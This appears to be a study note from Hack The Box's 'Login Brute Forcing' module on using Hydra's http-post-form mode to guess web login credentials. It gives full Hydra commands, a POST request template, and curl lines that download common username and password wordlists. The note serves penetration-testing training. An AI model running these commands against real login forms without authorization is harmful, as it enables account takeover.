# Login Brute Forcing

This documentation serves as a reference for automating brute-force attacks on login forms using Hydra, as covered in Hack The Box's "Login Brute Forcing" module.

## Overview

Brute forcing involves testing multiple credential combinations systematically to identify valid logins. Hydra's `http-post-form` module simplifies this process by automating HTTP POST requests.

## HTTP POST Request Example

```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

## Hydra Command Structure

```bash
hydra [options] target http-post-form "path:params:condition_string"
```

## Parameters

Path: Specifies the endpoint receiving POST requests. For example, `/login` would be the path.  
Params: Defines the fields and their placeholders in the POST request. For example, `username=^USER^&password=^PASS^`.  
Condition String: Defines the criteria for success or failure in the response. For example, `F=Invalid credentials` for failure detection or `S=302` for a redirect.

## Example Hydra Command

```bash
hydra -L usernames.txt -P passwords.txt IP -s PORT http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## Practical Steps

1. Identify the endpoint and parameters by inspecting the login form using browser developer tools or a proxy tool like Burp Suite.
2. Construct the params string using placeholders `^USER^` and `^PASS^` to map to the username and password fields in the POST request.
3. Define the condition string to identify success or failure responses.
4. Run Hydra with the appropriate options and wordlists to brute force the login form.

## Wordlists

Download wordlists for usernames and passwords:

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

## Sample Hydra Execution

```bash
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt IP -s PORT http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## Analyzing Responses

Use the browser’s developer tools or proxy interception to inspect server responses during login attempts. Ensure accurate failure or success conditions are configured for Hydra.

## Summary

- Hydra is a powerful tool for automating brute-force attacks on login forms.
- Properly analyze the target's structure and responses before running Hydra.
- Keep wordlists efficient and relevant to optimize the attack process.
